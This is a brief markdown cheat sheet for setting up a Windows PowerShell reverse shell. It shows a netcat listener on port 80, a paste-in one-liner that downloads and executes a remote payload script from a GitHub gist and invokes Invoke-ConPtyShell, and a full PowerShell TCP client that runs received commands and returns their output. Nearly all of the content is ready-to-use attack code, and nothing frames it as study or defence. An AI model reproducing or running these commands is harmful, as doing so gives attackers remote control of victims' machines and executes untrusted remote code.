## Server side (port 80)
- Use 80/87
```
nc -lp 80
```

## Client side
- Paste in powershell and change ip address and port number
```ps
IEX(IWR https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.29.21 80
```

## Script
- Change the ip address in the "quotes" and the port (80)
```ps
$client = New-Object System.Net.Sockets.TCPClient("192.168.29.21",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd) + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1
